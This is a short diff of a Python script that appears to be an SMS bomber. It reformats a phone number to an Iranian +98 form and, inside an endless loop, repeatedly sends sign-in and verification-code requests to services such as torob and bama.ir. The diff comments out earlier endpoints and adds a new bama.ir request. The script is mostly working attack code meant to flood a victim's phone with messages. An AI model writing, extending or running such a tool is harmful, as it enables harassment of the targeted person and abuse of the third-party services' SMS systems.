@@ -9,7 +9,7 @@ else:
     phone2 = '+98' + phone[1:]
     try:
         while True:
-            try:
+            '''try:
                 hamyarzaban_data = {'phone':phone}
                 hamyarzaban = requests.post("https://hamyarzaban.com/wp-content/themes/hamyarzaban/sms.php")
                 print(f"ham status: {hamyarzaban}")
@@ -85,7 +85,13 @@ else:
                 trob = requests.get('https://api.torob.com/a/phone/send-pin/?phone_number=' + phone)
                 print(f'trob status {trob}')
             except:
-                print("trob not")
-                
+                print("trob not")'''
+            try:
+                bama_data = {'cellNumber':phone}
+                bama = requests.post('https://bama.ir/signin-checkforcellnumber', json=bama_data)
+                print(f'bama status {bama}')
+            except:
+                print("bama not")
+            
     except:
         pass
